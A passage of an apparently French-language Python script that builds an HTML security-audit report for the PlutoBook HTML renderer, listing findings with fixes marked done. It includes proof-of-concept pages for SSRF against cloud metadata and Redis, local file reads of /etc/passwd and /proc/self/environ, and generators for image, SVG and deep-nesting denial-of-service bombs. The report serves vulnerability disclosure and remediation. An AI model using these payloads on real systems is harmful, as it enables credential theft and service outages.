#!/usr/bin/env python3
# Generateur du rapport HTML d'audit securite PlutoBook.
# Sortie: security-audit/{index.html, assets/style.css, Vxx-*/index.html, Vxx-*/poc/*}
# Le HTML produit est statique, autonome (pas de CDN), lisible par un dev humain.
import html, os, pathlib

# ROOT = dossier security-audit/. Le script vit dans security-audit/tools/ donc parents[1].
# Robuste quel que soit le repertoire de travail (local ou agent cloud).
ROOT = pathlib.Path(__file__).resolve().parents[1]

SEV = {
    "critique": ("Critique", "sev-crit"),
    "haute":    ("Haute",    "sev-high"),
    "moyenne+": ("Moyenne+", "sev-medhigh"),
    "moyenne":  ("Moyenne",  "sev-med"),
    "basse":    ("Basse",    "sev-low"),
    "info":     ("Info",     "sev-info"),
}

def esc(s): return html.escape(s, quote=False)

# ---------------------------------------------------------------------------
# Donnees des findings (ordre = criticite decroissante = ordre des commits)
# ---------------------------------------------------------------------------
F = []
def add(**k):
    # status: "todo" (a corriger) ou "done" (corrige). fixcommit: hash optionnel.
    k.setdefault("status", "todo")
    k.setdefault("fixcommit", "")
    F.append(k)

def status_html(f):
    if f["status"] == "done":
        c = f.get("fixcommit", "")
        extra = f' (<code>{esc(c)}</code>)' if c else ""
        return f'<span class="status-done">corrige</span>{extra}'
    return '<span class="status-todo">a corriger</span>'

add(
 id="V01", slug="V01-ssrf", severity="critique", cat="SSRF / requete forgee cote serveur",
 title="SSRF &amp; fetch multi-schema non filtre",
 keyfile="source/resource/resource.cpp:284",
 locations=[
   ("source/resource/resource.cpp:275-324", "DefaultResourceFetcher::fetchUrl passe l'URL brute a curl"),
   ("source/resource/resource.cpp:301-302", "CURLOPT_FOLLOWLOCATION=true, MAXREDIRS=30 par defaut"),
   ("source/document.cpp:1062-1075", "Document::fetchResource dispatche sans validation de schema"),
   ("include/plutobook.hpp:610-615", "defauts: verifyPeer/Host=true, followRedirects=true, timeout=300"),
 ],
 nature="""<p>Le fetcher par defaut construit une requete curl avec l'URL <em>brute</em> issue du document
 (<code>&lt;img src&gt;</code>, <code>&lt;link href&gt;</code>, CSS <code>url()</code>/<code>@import</code>,
 <code>@font-face src</code>, SVG <code>&lt;image href&gt;</code>) :</p>
 <pre><code>curl_easy_setopt(curl, CURLOPT_URL, url.data());   // resource.cpp:284
curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, m_followRedirects); // 301, defaut true
curl_easy_perform(curl);                             // 305</code></pre>
 <p>Aucun <code>CURLOPT_PROTOCOLS_STR</code> ni <code>CURLOPT_REDIR_PROTOCOLS_STR</code> n'est defini
 (grep sur tout le depot = 0 resultat). L'ensemble de protocoles par defaut de libcurl inclut selon
 le build <code>file</code>, <code>ftp</code>, <code>gopher</code>, <code>dict</code>, <code>tftp</code>,
 <code>scp</code>, <code>smb</code>, <code>ldap</code>&hellip; Aucun filtrage d'adresse de destination.</p>""",
 risk="""<p>Un document hostile force PlutoBook a emettre des requetes vers des cibles internes :</p>
 <ul>
   <li>Metadata cloud : <code>http://169.254.169.254/latest/meta-data/iam/security-credentials/</code>
       &rarr; vol de credentials.</li>
   <li>Services internes via <code>gopher://</code>/<code>dict://</code> (ex. Redis <code>127.0.0.1:6379</code>).</li>
   <li>Bypass par redirection : <code>http://attaquant/x.png</code> renvoie <code>302 Location: gopher://&hellip;</code>
       ou <code>file:///etc/passwd</code> ; comme <code>FOLLOWLOCATION</code> est actif et que les protocoles
       de redirection ne sont pas restreints, curl suit.</li>
 </ul>
 <p><strong>Impact</strong> : scan/interaction avec le reseau interne, exfiltration de secrets. Critique
 en rendu serveur de HTML non fiable.</p>""",
 repro=[
   "Lancer un service local factice (ex. <code>python3 poc/listener.py</code> qui logge toute connexion sur :8081).",
   "Rendre <code>poc/repro.html</code> avec PlutoBook (bibliotheque ou CLI).",
   "Observer que PlutoBook se connecte a 127.0.0.1:8081 / 169.254.169.254 alors que le document vient d'une source non fiable.",
 ],
 poc={
  "repro.html": """<!DOCTYPE html>
<html><head><meta charset="utf-8"><title>PoC SSRF</title></head>
<body>
  <!-- Chaque ressource declenche une requete sortante non filtree -->
  <img src="http://127.0.0.1:8081/ssrf-probe">
  <img src="http://169.254.169.254/latest/meta-data/">
  <link rel="stylesheet" href="gopher://127.0.0.1:6379/_INFO%0d%0a">
  <p>Si PlutoBook tente ces requetes, la SSRF est confirmee.</p>
</body></html>
""",
  "listener.py": """#!/usr/bin/env python3
# Ecoute sur 127.0.0.1:8081 et logge toute connexion (preuve de SSRF).
import socketserver
class H(socketserver.BaseRequestHandler):
    def handle(self):
        data = self.request.recv(2048)
        print("[SSRF] connexion recue:", self.client_address, data[:80])
with socketserver.TCPServer(("127.0.0.1", 8081), H) as s:
    print("listener SSRF sur 127.0.0.1:8081"); s.serve_forever()
""",
 },
 fix="""<p>Filtrer les schemas au point de fetch et durcir curl :</p>
 <ul>
   <li>Allowlist appliquee dans <code>DefaultResourceFetcher::fetchUrl</code> +
       <code>CURLOPT_PROTOCOLS_STR</code>/<code>CURLOPT_REDIR_PROTOCOLS_STR</code> = <code>http,https</code>.</li>
   <li>Hook validateur d'URL (voir plus bas) invoque avant tout fetch.</li>
   <li>Filtrage optionnel des adresses internes via <code>CURLOPT_PREREQFUNCTION</code>.</li>
 </ul>""",
 config="""Defaut : schemas autorises = <code>http,https,data</code>. Reactivation explicite des schemas
 dangereux via <code>ResourceFetcher::setAllowedProtocols(&hellip;)</code>. Validateur d'URL via
 <code>setUrlValidator(cb)</code> couvrant fetcher curl ET handler custom.""",
 status="done",
)

add(
 id="V02", slug="V02-local-file-read", severity="critique", cat="Divulgation de fichiers locaux",
 title="Lecture de fichiers locaux via file:// + traversal",
 keyfile="source/resource/url.cpp:568-575",
 locations=[
   ("source/resource/resource.cpp:380-386", "baseUrl() = CWD du process en file://"),
   ("source/resource/url.cpp:568-575", "Url::complete accepte les chemins absolus file:"),
   ("source/resource/url.cpp:505-539", "normalisation des .. (correcte mais aboutit a un chemin absolu)"),
   ("source/resource/resource.cpp:331-367", "branche non-curl: lecture directe de tout file://"),
 ],
 nature="""<p>La base URL par defaut est le repertoire courant du process encode en <code>file://</code>
 (<code>resource.cpp:380-386</code>). Les URL relatives resolvent donc sur le systeme de fichiers local,
 et les URL <code>file://</code> absolues sont acceptees telles quelles. Aucune politique cross-scheme :
 un document servi via <code>http://</code> peut referencer <code>file://</code>.</p>""",
 risk="""<p><code>&lt;link rel=stylesheet href="file:///etc/passwd"&gt;</code>,
 <code>&lt;img src="file:///proc/self/environ"&gt;</code>,
 <code>@font-face{src:url(file:///etc/shadow)}</code> : le contenu est tire dans le pipeline (texte de
 feuille de style parse, octets d'image/police decodes) et peut se retrouver reflete dans le PDF/PNG.
 La normalisation des <code>..</code> n'empeche pas d'atteindre un chemin absolu.
 <strong>Impact</strong> : lecture/exfiltration de fichiers locaux arbitraires.</p>""",
 repro=[
   "Rendre <code>poc/repro.html</code> avec PlutoBook depuis n'importe quel repertoire.",
   "Constater que le contenu de /etc/hostname (image) ou d'un fichier local (CSS) est charge.",
 ],
 poc={
  "repro.html": """<!DOCTYPE html>
<html><head><meta charset="utf-8">
  <!-- Lit une feuille de style locale arbitraire -->
  <link rel="stylesheet" href="file:///etc/passwd">
</head><body>
  <!-- Traversal relatif vers un fichier hors du dossier du document -->
  <img src="../../../../../../etc/hostname">
  <p>Si le fichier local est charge, la divulgation est confirmee.</p>
</body></html>
""",
 },
 fix="""<p>Introduction d'un modele de confiance premier niveau / sous-ressource :
 <code>ResourceLoader::loadUrl</code> prend desormais un drapeau <code>trusted</code> (defaut
 <code>false</code>), propage jusqu'a <code>DefaultResourceFetcher::fetchUrl(url, trusted)</code>
 (nouvelle surcharge virtuelle non pure sur <code>ResourceFetcher</code>, l'ancienne signature a un
 seul argument reste inchangee et vaut <code>trusted=false</code>). <code>Book::loadUrl</code> (donc
 <code>html2pdf</code>/<code>html2png</code> sur un fichier local) passe <code>trusted=true</code> :
 l'allowlist de schemas et le filtre IP interne ne s'appliquent pas au document de premier niveau,
 qui garde le schema explicitement demande par l'appelant. Toutes les sous-ressources
 (<code>Document::fetchResource</code> : images, feuilles de style, polices, references SVG) passent
 par le defaut <code>trusted=false</code> et restent filtrees par l'allowlist (donc <code>file://</code>
 et le traversal <code>../</code> vers un chemin absolu <code>file://</code> sont refuses). Le
 validateur d'URL (V01) s'applique dans les deux cas, sur l'URL resolue. Les redirections restent
 toujours limitees a <code>http,https</code> quel que soit le niveau de confiance ou l'allowlist
 configuree. Meme traitement applique a la branche non-curl.</p>""",
 config="""Defaut : <code>file://</code> desactive pour les sous-ressources uniquement (le document de
 premier niveau explicitement charge par l'appelant, ex. <code>html2pdf fichier.html</code>, n'est pas
 soumis a l'allowlist). Reactivation du <code>file://</code> en sous-ressource via
 <code>setAllowedProtocols(&hellip;, "file")</code>. Confinement optionnel a une racine via le
 validateur d'URL.""",
 status="done",
)

add(
 id="V03", slug="V03-font-freetype", severity="haute", cat="Surface RCE (parsing de police)",
 title="Octets de police bruts transmis a FreeType/brotli",
 keyfile="source/resource/fontresource.cpp:57",
 locations=[
   ("source/resource/fontresource.cpp:46-63", "FT_New_Memory_Face sur les octets bruts"),
   ("source/resource/fontresource.cpp:90", "FcFreeTypeCharSet parcourt la face"),
   ("source/resource/fontresource.cpp:99-104", "supportsFormat ne filtre que l'indice format() CSS"),
 ],
 nature="""<p>Les octets recuperes depuis <code>@font-face{src:url(&hellip;)}</code> (n'importe quel schema)
 sont passes directement a FreeType sans verification de magic-byte, de taille, ni allowlist de format :</p>
 <pre><code>FT_New_Memory_Face(ftLibrary, (FT_Byte*)resource.content(),
                   resource.contentLength(), 0, &amp;ftFace);  // fontresource.cpp:57</code></pre>
 <p>Si FreeType est bati avec brotli, la voie WOFF2 route ces octets par brotli + reconstruction sfnt
 (chemin historiquement riche en bugs).</p>""",
 risk="""<p><strong>Impact</strong> : corruption memoire de classe RCE, reductible a toute CVE de la
 version FreeType/brotli liee, atteignable depuis un simple document. PlutoBook n'ajoute aucune couche
 de pre-validation.</p>""",
 repro=[
   "Heberger/pointer une police malformee ou volumineuse via @font-face.",
   "Rendre poc/repro.html : les octets sont parses par FreeType quel que soit le format declare.",
   "Sous ASan, fuzzer la police pour exercer le parseur (la surface, pas un bug PlutoBook precis).",
 ],
 poc={
  "repro.html": """<!DOCTYPE html>
<html><head><meta charset="utf-8"><style>
  @font-face { font-family: x; src: url("poc/evil.ttf") format("truetype"); }
  body { font-family: x; }
</style></head><body>Texte rendu avec une police non fiable.</body></html>
""",
  "make-evil-font.py": """#!/usr/bin/env python3
# Fabrique un fichier 'evil.ttf' malforme (en-tete sfnt tronque) pour exercer le parseur FreeType.
# But: montrer que PlutoBook parse des octets arbitraires sans pre-validation.
open("evil.ttf","wb").write(b"\\x00\\x01\\x00\\x00" + b"\\x00"*8 + b"\\xff"*64)
print("evil.ttf ecrit (a fuzzer sous ASan)")
""",
 },
 fix="""<p><code>FTFontData::create</code> (<code>source/resource/fontresource.cpp</code>) verifie desormais,
 avant tout appel a <code>FT_New_Memory_Face</code> : (1) la taille des octets recus &le;
 <code>DefaultResourceFetcher::maxFontBytes()</code> ; (2) que les 4 premiers octets correspondent a une
 signature de police connue (sfnt <code>0x00010000</code>, <code>OTTO</code>, <code>true</code>,
 <code>typ1</code>, collection <code>ttcf</code>, <code>wOFF</code>, <code>wOF2</code>). En cas d'echec :
 message d'erreur propre via <code>plutobook_set_error_message</code>, retour <code>nullptr</code>
 (fallback sur les polices systeme), aucun octet n'atteint FreeType/brotli. Verification faite au point
 unique ou les octets de police sont sur le point d'etre parses, donc appliquee quelle que soit la source
 (fetcher par defaut curl/fichier ou <code>ResourceFetcher</code> personnalise) -- independamment de
 <code>supportsFormat</code>, qui ne filtre que l'indice CSS <code>format()</code> et peut mentir.</p>""",
 config="""Knob <code>DefaultResourceFetcher::setMaxFontBytes(size_t)</code> (membre
 <code>m_maxFontBytes</code>, defaut 8&nbsp;MiB) + accesseur <code>maxFontBytes()</code>. Allowlist de
 magic-bytes fixe (non configurable, correctif pur de securite).""",
 status="done",
)

add(
 id="V04", slug="V04-download-size", severity="haute", cat="Deni de service (memoire)",
 title="Aucune limite de taille de telechargement",
 keyfile="source/resource/resource.cpp:268-273",
 locations=[
   ("source/resource/resource.cpp:268-273", "writeCallback insere sans plafond"),
   ("source/resource/resource.cpp:275-324", "aucun CURLOPT_MAXFILESIZE"),
 ],
 nature="""<pre><code>static size_t writeCallback(const char* contents, size_t bs, size_t nb, ByteArray* r) {
    size_t total = bs * nb;
    r-&gt;insert(r-&gt;end(), contents, contents + total);  // croissance illimitee
    return total;
}</code></pre>
 <p>Le corps entier est bufferise en <code>std::vector&lt;char&gt;</code>. Ni <code>CURLOPT_MAXFILESIZE_LARGE</code>
 ni cap dans le callback.</p>""",
 risk="""<p>Un serveur en <em>chunked encoding</em> sert des gigaoctets (timeout par defaut 300 s).
 N URL distinctes = N buffers concurrents (dedup seulement sur URL identiques, <code>document.cpp:1066</code>).
 <strong>Impact</strong> : epuisement memoire &rarr; kill du process (DoS).</p>""",
 repro=[
   "Lancer poc/huge-server.py (repond un flux infini).",
   "Rendre poc/repro.html qui reference http://127.0.0.1:8082/huge.",
   "Observer la RAM croitre sans borne.",
 ],
 poc={
  "repro.html": """<!DOCTYPE html>
<html><head><meta charset="utf-8"></head>
<body><img src="http://127.0.0.1:8082/huge"><p>OOM si aucun plafond.</p></body></html>
""",
  "huge-server.py": """#!/usr/bin/env python3
# Sert un flux 'infini' pour prouver l'absence de plafond de telechargement.
from http.server import BaseHTTPRequestHandler, HTTPServer
class H(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200); self.send_header("Content-Type","image/png"); self.end_headers()
        chunk = b"\\x00" * (1<<20)
        try:
            while True: self.wfile.write(chunk)   # jamais termine
        except BrokenPipeError: pass
HTTPServer(("127.0.0.1",8082), H).serve_forever()
""",
 },
 fix="""<p><code>DefaultResourceFetcher::fetchUrl</code> definit desormais <code>CURLOPT_MAXFILESIZE_LARGE</code>
 (rejet immediat si une taille annoncee, ex. <code>Content-Length</code>, depasse le plafond) et
 <code>CURLOPT_CONNECTTIMEOUT</code>. <code>CURLOPT_MAXFILESIZE_LARGE</code> ne verifie qu'une taille
 <em>connue a l'avance</em> ; une reponse en <em>chunked encoding</em> n'en annonce aucune et peut donc le
 contourner completement. Pour fermer cette faille, <code>CURLOPT_WRITEDATA</code> pointe maintenant vers
 une petite struct <code>WriteCallbackContext</code> (<code>ByteArray*</code> + plafond) au lieu du seul
 <code>ByteArray*</code> : <code>writeCallback</code> connait ainsi le plafond et, des que la taille
 accumulee le depasserait, retourne un compte court (0) &mdash; ce que curl interprete comme une erreur
 d'ecriture et interrompt le transfert immediatement (<code>CURLE_WRITE_ERROR</code>), quelle que soit la
 forme du transfert (chunked ou non). Les deux codes d'echec (<code>CURLE_FILESIZE_EXCEEDED</code> et
 <code>CURLE_WRITE_ERROR</code>) sont traduits en un message d'erreur clair et specifique (taille max
 depassee) au lieu du <code>curl_easy_strerror</code> generique. La branche non-curl (lecture de fichier
 local via <code>tellg</code>) n'applique pas ce plafond : la taille y est connue a l'avance et lue en une
 seule allocation bornee, ce qui ne correspond pas au modele de menace (flux distant sans fin) ; l'ajouter
 risquerait de tronquer silencieusement un gros fichier local legitime pour aucun benefice equivalent.</p>""",
 config="""Knobs <code>DefaultResourceFetcher::setMaxDownloadSize(size_t)</code> (membre
 <code>m_maxDownloadSize</code>, defaut 32&nbsp;MiB ; <code>0</code> = illimite) et
 <code>setConnectTimeout(int)</code> (membre <code>m_connectTimeout</code>, defaut 30&nbsp;s).""",
 status="done",
)

add(
 id="V05", slug="V05-image-bomb", severity="haute", cat="Deni de service (memoire)",
 title="Bombe de decompression d'image (aucun budget pixel)",
 keyfile="source/resource/imageresource.cpp:100-193",
 locations=[
   ("source/resource/imageresource.cpp:92-99", "PNG via libpng/cairo: cairo_image_surface_create_from_png_stream direct, aucun cap (voie reellement empruntee des que cairo est bati avec le support PNG -- cas de ce depot -- puisque STBI_NO_PNG est alors defini)"),
   ("source/resource/imageresource.cpp:162-169", "stb (PNG si CAIRO_HAS_PNG_FUNCTIONS absent, sinon GIF/BMP/TGA/...): STBI_MAX_DIMENSIONS=1<<24, pas de cap pixel total"),
   ("source/resource/imageresource.cpp:100-124", "turbojpeg: width/height non bornes vers cairo"),
   ("source/resource/imageresource.cpp:139", "webp: config.input.width/height direct vers cairo"),
 ],
 nature="""<p>Aucun budget de pixels global. stb ne borne que chaque axe (<code>1&lt;&lt;24</code>) et l'overflow
 d'allocation (~2 Go) ; un PNG de quelques Ko en ~23000&times;23000 se decompresse en ~2 Go RGBA. turbojpeg
 accepte jusqu'a 65535&sup2; (~17 Go), webp jusqu'a 16383&sup2; (~1 Go), passes directement a
 <code>cairo_image_surface_create</code>. Sur ce depot, <code>cairo</code> est bati avec le support PNG natif
 (<code>CAIRO_HAS_PNG_FUNCTIONS</code>), donc <code>STBI_NO_PNG</code> est actif et un PNG ne passe jamais par
 stb : il est decode directement par <code>cairo_image_surface_create_from_png_stream</code> (libpng), une
 quatrieme voie non bornee que le PoC <code>make-bomb.py</code> emprunte reellement.</p>""",
 risk="<p><strong>Impact</strong> : epuisement memoire depuis une image minuscule (DoS).</p>",
 repro=[
   "Generer la bombe : <code>python3 poc/make-bomb.py</code> (cree bomb.png ~23000x23000, quelques Ko).",
   "Rendre poc/repro.html qui l'affiche &rarr; ~2 Go alloues.",
 ],
 poc={
  "repro.html": """<!DOCTYPE html>
<html><head><meta charset="utf-8"></head>
<body><img src="poc/bomb.png"><p>Decompression ~2 Go depuis quelques Ko.</p></body></html>
""",
  "make-bomb.py": """#!/usr/bin/env python3
# Cree un PNG tout-noir de 23000x23000 (compresse a quelques Ko, ~2 Go decompresse).
import zlib, struct
W = H = 23000
def chunk(t, d): return struct.pack(">I", len(d)) + t + d + struct.pack(">I", zlib.crc32(t+d) & 0xffffffff)
raw = bytearray()
row = b"\\x00" + b"\\x00\\x00\\x00" * W          # filtre 0 + pixels RGB noirs
for _ in range(H): raw += row
png = b"\\x89PNG\\r\\n\\x1a\\n"
png += chunk(b"IHDR", struct.pack(">IIBBBBB", W, H, 8, 2, 0, 0, 0))
png += chunk(b"IDAT", zlib.compress(bytes(raw), 9))
png += chunk(b"IEND", b"")
open("bomb.png","wb").write(png)
print("bomb.png ecrit:", len(png), "octets pour", W, "x", H)
""",
 },
 fix="""<p>Un budget de pixels (<code>largeur &times; hauteur</code>) est desormais applique <strong>avant</strong>
 toute allocation du decodage complet, sur les <strong>quatre</strong> voies de <code>decodeBitmapImage</code> :</p>
 <ul>
   <li>PNG via cairo/libpng : l'IHDR (largeur/hauteur, toujours les 8 premiers octets apres la signature PNG)
       est lu directement -- sans invoquer le decodeur complet -- avant l'appel a
       <code>cairo_image_surface_create_from_png_stream</code>.</li>
   <li>turbojpeg : verifie juste apres <code>tjDecompressHeader</code>, avant <code>cairo_image_surface_create</code>.</li>
   <li>webp : verifie juste apres <code>WebPGetFeatures</code>, avant <code>cairo_image_surface_create</code>.</li>
   <li>stb (GIF/BMP/TGA/&hellip;, et PNG si <code>cairo</code> est bati sans support PNG) : <code>stbi_info_from_memory</code>
       est appele avant <code>stbi_load_from_memory</code> pour obtenir les dimensions sans decoder les pixels.</li>
 </ul>
 <p>Les quatre points appellent une fonction commune <code>checkImagePixelBudget(width, height)</code> qui lit
 <code>DefaultResourceFetcher::maxImagePixels()</code> -- accesseur global au meme titre que
 <code>maxFontBytes()</code> (V03), puisque le decodeur d'image n'a pas de reference directe au fetcher --
 et echoue proprement (<code>plutobook_set_error_message</code> + retour <code>nullptr</code>) sans jamais
 allouer le tampon/la surface plein format. En defense en profondeur, <code>STBI_MAX_DIMENSIONS</code> est
 aussi abaisse de <code>1&lt;&lt;24</code> (~16,7 M) a <code>65535</code> par <code>#define</code> avant
 l'inclusion de <code>stb_image.h</code>.</p>""",
 config="""Knob <code>DefaultResourceFetcher::setMaxImagePixels(uint64_t)</code> (membre
 <code>m_maxImagePixels</code>, defaut 64&nbsp;MP = <code>64ULL*1000*1000</code> ; <code>0</code> = illimite)
 + accesseur <code>maxImagePixels()</code>.""",
 status="done",
)

add(
 id="V06", slug="V06-table-colspan", severity="haute", cat="Deni de service (memoire)",
 title="colspan / col span de table non bornes",
 keyfile="source/layout/tablebox.cpp:1389",
 locations=[
   ("source/htmldocument.cpp:858-861", "colSpan() ne clampe que le minimum (1)"),
   ("source/layout/tablebox.cpp:1389-1400", "boucle emplace col < colSpan() dans un pmr::map"),
   ("source/layout/tablebox.cpp:439-443", "col/colgroup span: emplace_back en boucle"),
   ("source/layout/tablebox.cpp:1364-1376", "rowSpan EST correctement clampe (modele a repliquer)"),
 ],
 nature="""<p><code>HTMLTableCellElement::colSpan()</code> ne borne que le minimum (1), pas le maximum
 (la spec HTML impose 1000). La valeur alimente une boucle qui <code>emplace</code> dans un
 <code>std::pmr::map</code> (noeuds jamais liberes, cf. Heap monotone) et fait croitre le vecteur
 <code>columns</code>.</p>""",
 risk="""<p><code>&lt;td colspan=200000000&gt;</code> &rarr; jusqu'a ~4,3e9 allocations non liberees.
 Idem <code>&lt;colgroup span=&hellip;&gt;</code>. <strong>Impact</strong> : OOM.</p>""",
 repro=["Rendre poc/repro.html &rarr; explosion memoire lors du build de la table."],
 poc={
  "repro.html": """<!DOCTYPE html>
<html><head><meta charset="utf-8"></head>
<body><table><tr><td colspan="200000000">x</td></tr></table></body></html>
""",
 },
 fix="""<p><code>HTMLTableCellElement::colSpan()</code>/<code>rowSpan()</code> et
 <code>HTMLTableColElement::span()</code> (<code>source/htmldocument.cpp</code>) plafonnent desormais
 la valeur brute de l'attribut via un helper <code>clampTableSpanMax()</code> (et
 <code>clampTableSpan()</code>, qui y ajoute le minimum existant de 1) avant qu'elle n'atteigne
 <code>tablebox.cpp</code> : la boucle <code>emplace</code> (<code>:1389-1400</code>) et la boucle
 <code>col</code>/<code>colgroup</code> <code>span</code> (<code>:439-443</code>) restent inchangees
 mais ne voient plus jamais une valeur non bornee. <code>rowSpan()</code> conserve la valeur spec
 <code>0</code> (« jusqu'a la fin du groupe de lignes ») -- seul le maximum lui est applique, pas le
 minimum -- et reste par ailleurs deja borne par le nombre de lignes reel dans
 <code>TableSectionBox::build()</code> (<code>:1364-1376</code>, modele repris ici).</p>""",
 config="""Nouvelle facade de configuration reutilisable <strong>EngineLimits</strong>
 (<code>include/plutobook.hpp</code> + <code>include/plutobook.h</code>), accessible via le singleton
 global <code>plutobook::engineLimits()</code> (meme style que
 <code>plutobook::defaultResourceFetcher()</code>) : <code>setMaxTableSpan(uint32_t)</code> /
 <code>maxTableSpan()</code>, <strong>defaut 1000</strong> (valeur spec HTML), <code>0</code> =
 illimite. API C correspondante : <code>plutobook_set_max_table_span(unsigned int)</code>. Ce sera le
 point d'ancrage pour les futures limites moteur (V07-V12 : profondeur d'imbrication, budget
 d'expansion <code>&lt;use&gt;</code>, nombre de pages, longueur de compteur, <code>column-count</code>) --
 voir la section C du guide de correctifs.""",
 status="done",
)

add(
 id="V07", slug="V07-svg-use", severity="haute", cat="Deni de service (memoire/CPU)",
 title="Expansion exponentielle de SVG &lt;use&gt; (billion laughs)",
 keyfile="source/svgdocument.cpp:336-406",
 locations=[
   ("source/svgdocument.cpp:336-406", "SVGUseElement::finishParsingDocument clone + re-descend"),
   ("source/svgdocument.cpp:379-386", "garde limitee aux cycles par ancetre de meme id"),
   ("source/svgdocument.cpp:788,900,954", "contraste: gradient/pattern ont un garde std::set"),
 ],
 nature="""<p><code>&lt;use&gt;</code> clone le sous-arbre cible et re-descend dans les enfants clones. La
 seule garde bloque les cycles <em>par ancetre de meme id</em>, mais pas le <em>fan-out</em> entre freres.
 Une echelle de doublement produit 2^N noeuds depuis un SVG O(N), tous bump-alloues et jamais liberes.</p>""",
 risk="<p><strong>Impact</strong> : OOM/hang depuis un tout petit SVG.</p>",
 repro=[
   "Generer : <code>python3 poc/make-svg-bomb.py</code> (30 niveaux).",
   "Rendre bomb.svg &rarr; 2^30 instanciations.",
 ],
 poc={
  "make-svg-bomb.py": """#!/usr/bin/env python3
# Echelle de doublement <use>: N niveaux -> 2^N noeuds instancies.
N = 30
out = ['<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">']
out.append('<g id="x0"><rect width="1" height="1"/></g>')
for i in range(1, N+1):
    out.append(f'<g id="x{i}"><use xlink:href="#x{i-1}"/><use xlink:href="#x{i-1}"/></g>')
out.append(f'<use xlink:href="#x{N}"/></svg>')
open("bomb.svg","w").write("\\n".join(out))
print(f"bomb.svg ecrit: {N} niveaux -> 2^{N} noeuds")
""",
  "repro.html": """<!DOCTYPE html>
<html><head><meta charset="utf-8"></head>
<body><img src="poc/bomb.svg" width="100"></body></html>
""",
 },
 fix="""<p>Budget d'expansion <code>&lt;use&gt;</code> : plafond du nombre total de noeuds instancies ET de
 la profondeur (cf. V08), a l'image du garde <code>std::set</code> des gradients/patterns.</p>""",
 config="Budget configurable via <code>EngineLimits</code> : <code>setMaxUseExpansion</code> (defaut 100000 noeuds) et <code>setMaxUseDepth</code> (defaut 512) ; API C <code>plutobook_set_max_use_expansion</code>/<code>_depth</code>.",
 status="done",
)

add(
 id="V08", slug="V08-recursion", severity="haute", cat="Deni de service (stack overflow)",
 title="Recursion non bornee : parsing CSS, layout, paint, destruction",
 keyfile="source/csstokenizer.h:173",
 locations=[
   ("source/csstokenizer.h:173-206", "consumeComponent recurse une frame par ( [ { imbrique"),
   ("source/cssparser.cpp:740-858", "consumePseudoSelector: :is()/:not()/:where()/:has() imbriques"),
   ("source/cssparser.cpp:365-373", "at-rules imbriquees @media{@media{...}}"),
   ("source/document.cpp:267,236", "finishParsingDocument / cloneChildren recursent par profondeur"),
   ("source/layout/blockbox.cpp:1541", "layout recursif ; source/layout/box.cpp:37 destruction recursive"),
 ],
 nature="""<p>Aucune limite de profondeur nulle part. Vecteurs : blocs de tokens CSS
 (<code>((((&hellip;</code>, <code>[[[[&hellip;</code>), pseudo-classes fonctionnelles imbriquees
 (<code>:not(:not(&hellip;))</code>), at-rules imbriquees, et surtout l'arbre profond : le parsing HTML
 est iteratif mais la finalisation, le clone, le <em>layout</em>, le paint et la <em>destruction</em>
 (<code>~Box</code>) recursent par profondeur.</p>""",
 risk="<p><code>&lt;div&gt;</code>&times;200000 ou <code>((((&hellip;</code> (200k) &rarr; stack overflow &rarr; SIGSEGV (DoS).</p>",
 repro=[
   "Generer : <code>python3 poc/make-deep.py</code> (cree deep.html et deep.css).",
   "Rendre chaque fichier &rarr; crash par depassement de pile.",
 ],
 poc={
  "make-deep.py": """#!/usr/bin/env python3
# Deux vecteurs: imbrication d'elements et imbrication de blocs CSS.
open("deep.html","w").write("<!DOCTYPE html><html><body>" + "<div>"*200000 + "x" + "</div>"*200000 + "</body></html>")
open("deep.css.html","w").write("<!DOCTYPE html><html><head><style>a:" + "("*200000 + "</style></head><body>x</body></html>")
print("deep.html et deep.css.html ecrits")
""",
 },
 fix="""<p>Compteur de profondeur partage, verifie dans <code>CSSTokenStream::consumeComponent</code>
 (<code>csstokenizer.h</code>/<code>.cpp</code>, thread_local) pour la recursion de blocs de tokens
 (<code>((((&hellip;</code>, <code>:not(:not(&hellip;))</code>) ; dans <code>CSSParser::NestingScope</code>
 (RAII, membre <code>m_nestingDepth</code>) pour la recursion selecteurs (<code>consumeSelectorList</code>,
 rappelee par <code>consumePseudoSelector</code>) et at-rules (<code>consumeRuleList</code>, rappelee par
 <code>consumeMediaRule</code>). Au-dela de la limite : arret de la recursion, construction traitee comme
 une erreur de parsing (pas de crash, pas d'UB).</p>
 <p>Cote arbre : profondeur bornee <strong>au parsing</strong>, pas dans les passes recursives en aval.
 HTML : un premier correctif ne bornait que le point de rattachement DOM (<code>currentInsertionParent()</code>)
 en laissant la pile <code>HTMLElementStack</code> (<code>m_openElements</code>) croitre sans limite ; or
 cette pile est parcourue de bout en bout par (quasi) toutes les verifications de portee de l'algorithme
 HTML5 (<code>inScope</code>, <code>inTableScope</code>, <code>inButtonScope</code>, ...), executees a
 chaque token -- ce premier correctif eliminait donc le crash par depassement de pile mais pas le cout
 <code>O(profondeur)</code> de ces verifications, qui restait quadratique en pratique (<code>&lt;div&gt;</code>
 x200000 ne crashait plus mais mettait &gt;60s). Le correctif final borne <strong>la pile elle-meme</strong>
 (<code>HTMLParser::pushElement()</code>) : une fois <code>maxNestingDepth()</code> elements ouverts, une
 balise ouvrante supplementaire est toujours creee et inseree dans le DOM (contenu preserve, devient un
 frere de l'element au plafond plutot qu'un descendant) mais n'est plus poussee sur la pile -- les
 verifications de portee restent alors bornees en <code>O(maxNestingDepth)</code> quel que soit le nombre
 total de balises. Les transitions de mode d'insertion qui accompagnent normalement un <code>push</code>
 (entree en mode table/select/frameset/...) sont conditionnees au succes de ce <code>push</code>, pour que
 la machine a etats ne se croie jamais "a l'interieur" d'un element qui n'est pas reellement ouvert -- ce
 qui aurait fait echouer les <code>assert</code> de coherence de portee (ex. "un td/th est en table scope"
 en mode InCell). De meme, les quelques points ou l'algorithme insere une balise implicite puis retraite le
 token (ex. <code>&lt;tbody&gt;</code> implicite avant un <code>&lt;tr&gt;</code> hors contexte) ne
 retraitent que si cette insertion implicite a reellement eu lieu, sinon le token est abandonne plutot que
 de boucler indefiniment sur la meme balise implicite jamais poussee. Les elements
 <code>&lt;title&gt;/&lt;style&gt;/&lt;script&gt;/&lt;textarea&gt;/&lt;xmp&gt;/&lt;iframe&gt;/&lt;noembed&gt;</code>
 sont exemptes du plafond : une fois le tokenizer bascule en RCDATA/RAWTEXT/donnees-de-script, il ne
